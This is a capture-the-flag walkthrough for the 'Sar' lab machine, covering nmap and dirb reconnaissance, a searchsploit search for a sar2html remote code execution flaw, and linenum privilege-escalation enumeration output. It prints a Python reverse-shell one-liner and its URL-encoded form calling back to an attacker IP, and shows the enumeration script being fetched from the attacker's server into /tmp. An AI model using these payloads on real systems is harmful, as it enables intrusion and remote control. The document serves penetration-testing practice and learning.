# IP: 192.168.114.35

# 192.168.114.35

# Latest-IP: 192.168.103.35


# Nmap

```javascript
┌──(dx㉿kali)-[~]
└─$ nmap 192.168.114.35                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 01:38 EDT
Nmap scan report for 192.168.114.35
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 59.67 seconds
```

# NMAP-Advanced Section
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 192.168.114.35
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 01:40 EDT
Nmap scan report for 192.168.114.35
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
```

# Navigating to Port-80

![Sar-provingground-webpage](https://user-images.githubusercontent.com/98345027/187840124-10cea880-c77d-44e0-b77e-0da506295069.png)

# Robots.txt Webpage
![sar-robots-txt-provingground](https://user-images.githubusercontent.com/98345027/187840339-c9d282a8-f05b-4c2e-bef2-c8ea52bc0dd1.png)
```javascript
Note: In The Robots.txt page we got: sar2HTML
lets try to append in the url: http://192.168.114.35/sar2HTML/
```

![sartohtml-webpage-provingground](https://user-images.githubusercontent.com/98345027/187841032-e90bafbb-f40e-460a-8308-974c9be0f27d.png)

# Findingd from /sar2HTML
```javascript
1. From the webpage we found the Version of sar2html 
2. From the Source page we don't fnd anything relevant to the information
```

# Dirbuster: checking for directory
```javascript
┌──(dx㉿kali)-[~]
└─$ dirb http://192.168.114.35/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  1 01:58:37 2022
URL_BASE: http://192.168.114.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.114.35/ ----
+ http://192.168.114.35/index.html (CODE:200|SIZE:10918)                                                                                        
+ http://192.168.114.35/phpinfo.php (CODE:200|SIZE:95499)                                                                                       
+ http://192.168.114.35/robots.txt (CODE:200|SIZE:9)                                                                                            
+ http://192.168.114.35/server-status (CODE:403|SIZE:279)                                                                                       
                                                                                                                                                 
-----------------
END_TIME: Thu Sep  1 02:13:04 2022
DOWNLOADED: 4612 - FOUND: 4
```


# Searchingsploit 
```javascript
┌──(dx㉿kali)-[~]
└─$ searchsploit sar2html
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Executi | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution   | php/webapps/47204.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
                        
```

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.114",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# Url Encode Pyload

```javascript
latest-today
%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%31%30%33%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27%0a
```

#### Escalation

`` Checking the Local Enumeration for SUID  bit set``
``But didn't find anything that escalate our priviledges ``
```bash
$ find / -type f -perm -u=s 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
/snap/core/7917/bin/mount
/snap/core/7917/bin/ping
/snap/core/7917/bin/ping6
/snap/core/7917/bin/su
/snap/core/7917/bin/umount
/snap/core/7917/usr/bin/chfn
/snap/core/7917/usr/bin/chsh
/snap/core/7917/usr/bin/gpasswd
/snap/core/7917/usr/bin/newgrp
/snap/core/7917/usr/bin/passwd
/snap/core/7917/usr/bin/sudo
/snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7917/usr/lib/openssh/ssh-keysign
/snap/core/7917/usr/lib/snapd/snap-confine
/snap/core/7917/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
$ 

```

```bash
1.First Download the linenum.sh from github 
2.Start the python server in your kali linux virtualbox by command: python -m http.server 8000
3.Find your  kali linux(attacker machine) Ip address
4.Navigate to browser and type Your IP:8000

```
```bash
                                                                      
┌──(dx㉿kali)-[~/Desktop]
└─$ python -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [10/Sep/2022 02:40:47] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [10/Sep/2022 02:40:47] code 404, message File not found
127.0.0.1 - - [10/Sep/2022 02:40:47] "GET /favicon.ico HTTP/1.1" 404 -

```
``Downloading the linenum.sh file ``

```bash
$ cd /tmp
$ pwd
/tmp
$ wget http://0.0.0.0:8000/linenum.sh
--2022-09-10 12:11:59--  http://0.0.0.0:8000/linenum.sh
Connecting to 0.0.0.0:8000... failed: Connection refused.
$ wget http://192.168.49.103:8000/linenum.sh
--2022-09-10 12:13:26--  http://192.168.49.103:8000/linenum.sh
Connecting to 192.168.49.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'linenum.sh'

     0K .......... .......... .......... .......... .....     100%  101K=0.4s

2022-09-10 12:13:27 (101 KB/s) - 'linenum.sh' saved [46631/46631]

$ ls
linenum.sh
$ chmod +x linenum.sh
$ ls -la
total 56
drwxrwxrwt  2 root     root      4096 Sep 10 12:13 .
drwxr-xr-x 24 root     root      4096 Mar 10  2020 ..
-rwxr-xr-x  1 www-data www-data 46631 Sep 10 12:08 linenum.sh

```

## Running the script

```javascript
$ ./linenum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sat Sep 10 12:14:19 IST 2022                                          
                                                                      

### SYSTEM ##############################################
[-] Kernel information:
Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 5.0.0-23-generic (buildd@lgw01-amd64-030) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
sar


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest


[-] Who else is logged on:
 12:14:19 up 44 min,  0 users,  load average: 0.86, 0.92, 0.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=106(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
uid=107(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=109(rtkit) gid=114(rtkit) groups=114(rtkit)
uid=110(cups-pk-helper) gid=116(lpadmin) groups=116(lpadmin)
uid=111(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=112(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=113(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=114(saned) gid=119(saned) groups=119(saned),118(scanner)
uid=115(pulse) gid=120(pulse) groups=120(pulse),29(audio)
uid=116(avahi) gid=122(avahi) groups=122(avahi)
uid=117(colord) gid=123(colord) groups=123(colord)
uid=118(hplip) gid=7(lp) groups=7(lp)
uid=119(geoclue) gid=124(geoclue) groups=124(geoclue)
uid=120(gnome-initial-setup) gid=65534(nogroup) groups=65534(nogroup)
uid=121(gdm) gid=125(gdm) groups=125(gdm)
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
uid=999(vboxadd) gid=1(daemon) groups=1(daemon)
uid=122(mysql) gid=127(mysql) groups=127(mysql)
uid=123(sshd) gid=65534(nogroup) groups=65534(nogroup)


[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
love:x:1000:1000:love,,,:/home/love:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/love/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  3 root     root     4.0K Jul 22  2020 .
drwxr-xr-x 24 root     root     4.0K Mar 10  2020 ..
-rw-r--r--  1 www-data www-data   33 Sep 10 11:32 local.txt
drwxr-xr-x 17 love     love     4.0K Jul 24  2020 love


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_LOG_DIR=/var/log/apache2
LANG=C
OLDPWD=/home
INVOCATION_ID=58729bfc1a3c452ea0347e72b2522d95
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/tmp
JOURNAL_STREAM=9:20388
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=1
LANGUAGE=en_IN:en
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
drwxr-xr-x 2 root root  4096 Oct 20  2019 /bin
drwxr-xr-x 2 root root 12288 Feb 15  2022 /sbin
drwxr-xr-x 2 root root 49152 Jul 14  2020 /usr/bin
drwxr-xr-x 2 root root  4096 Aug  6  2019 /usr/local/bin
drwxr-xr-x 2 root root  4096 Aug  6  2019 /usr/local/sbin
drwxr-xr-x 2 root root 12288 Jul 14  2020 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK           022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  787 Oct 21  2019 /etc/crontab

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Oct 20  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   712 Dec 17  2018 php
-rw-r--r--   1 root root   191 Oct 20  2019 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 Oct 20  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root   376 Nov 20  2017 apport
-rwxr-xr-x   1 root root  1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root   355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root   384 Dec 13  2012 cracklib-runtime
-rwxr-xr-x   1 root root  1176 Nov  3  2017 dpkg
-rwxr-xr-x   1 root root   372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root  1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root   249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root  3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root   246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root   214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Aug  6  2019 .
drwxr-xr-x 125 root root 12288 Jul 14  2020 ..
-rw-r--r--   1 root root   102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   211 Nov 12  2018 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh


[-] Anything interesting in /var/spool/cron/crontabs:
total 12
drwx-wx--T 2 www-data www-data 4096 Oct 21  2019 .
drwxr-xr-x 3 www-data www-data 4096 Aug  6  2019 ..
-rw------- 1 www-data www-data 1089 Oct 21  2019 root


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 May 29  2017 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 www-data www-data 4096 Oct 20  2019 .
drwxr-xr-x 6 www-data www-data 4096 Oct 20  2019 ..
-rw------- 1 root     root        9 Sep 10 11:39 cron.daily
-rw------- 1 root     root        9 Sep 10 11:34 cron.monthly
-rw------- 1 root     root        9 Sep 10 11:44 cron.weekly


[-] Systemd timers:
NEXT                         LEFT           LAST                         PASSED      UNIT                         ACTIVATES
Sat 2022-09-10 12:39:00 IST  24min left     Sat 2022-09-10 12:09:00 IST  5min ago    phpsessionclean.timer        phpsessionclean.service
Sat 2022-09-10 13:04:58 IST  50min left     Sat 2022-09-10 12:01:33 IST  12min ago   anacron.timer                anacron.service
Sat 2022-09-10 15:53:09 IST  3h 38min left  Sat 2022-09-10 11:32:06 IST  42min ago   motd-news.timer              motd-news.service
Sun 2022-09-11 03:00:22 IST  14h left       Sat 2022-09-10 11:51:56 IST  22min ago   apt-daily.timer              apt-daily.service
Sun 2022-09-11 11:44:25 IST  23h left       Sat 2022-09-10 11:44:25 IST  29min ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-09-12 00:00:00 IST  1 day 11h left Sat 2022-09-10 11:32:06 IST  42min ago   fstrim.timer                 fstrim.service
n/a                          n/a            Sat 2022-09-10 12:13:22 IST  1min 2s ago apt-daily-upgrade.timer      apt-daily-upgrade.service

7 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.103.35  netmask 255.255.255.0  broadcast 192.168.103.255
        inet6 fe80::776b:9e7e:472:c516  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:25:7c  txqueuelen 1000  (Ethernet)
        RX packets 1828  bytes 166185 (166.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 538  bytes 109977 (109.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 297  bytes 24407 (24.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 297  bytes 24407 (24.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
_gateway (192.168.103.254) at 00:50:56:ba:08:3f [ether] on ens160


[-] Nameserver(s):
nameserver 127.0.0.53


[-] Nameserver(s):
Global
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 3 (ens160)
      Current Scopes: DNS
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no
         DNS Servers: 192.168.103.254


[-] Default route:
default         _gateway        0.0.0.0         UG    20100  0        0 ens160


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:43533           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp6       0      0 :::44545                :::*                                -                   
udp6       0      0 :::5353                 :::*                                -                   


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.6 159956  6308 ?        Ss   11:29   0:01 /sbin/init splash
root         2  0.0  0.0      0     0 ?        S    11:29   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   11:29   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   11:29   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   11:29   0:00 [kworker/0:0H-kb]
root         8  0.0  0.0      0     0 ?        I<   11:29   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    11:29   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    11:29   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    11:29   0:00 [migration/0]
root        12  0.0  0.0      0     0 ?        S    11:29   0:00 [idle_inject/0]
root        13  0.0  0.0      0     0 ?        I    11:29   0:00 [kworker/0:1-eve]
root        14  0.0  0.0      0     0 ?        S    11:29   0:00 [cpuhp/0]
root        15  0.0  0.0      0     0 ?        S    11:29   0:00 [kdevtmpfs]
root        16  0.0  0.0      0     0 ?        I<   11:29   0:00 [netns]
root        17  0.0  0.0      0     0 ?        S    11:29   0:00 [rcu_tasks_kthre]
root        18  0.0  0.0      0     0 ?        S    11:29   0:00 [kauditd]
root        19  0.0  0.0      0     0 ?        S    11:29   0:00 [khungtaskd]
root        20  0.0  0.0      0     0 ?        S    11:29   0:00 [oom_reaper]
root        21  0.0  0.0      0     0 ?        I<   11:29   0:00 [writeback]
root        22  0.0  0.0      0     0 ?        S    11:29   0:00 [kcompactd0]
root        23  0.0  0.0      0     0 ?        SN   11:29   0:00 [ksmd]
root        24  0.0  0.0      0     0 ?        SN   11:29   0:00 [khugepaged]
root        25  0.0  0.0      0     0 ?        I<   11:29   0:00 [crypto]
root        26  0.0  0.0      0     0 ?        I<   11:29   0:00 [kintegrityd]
root        27  0.0  0.0      0     0 ?        I<   11:29   0:00 [kblockd]
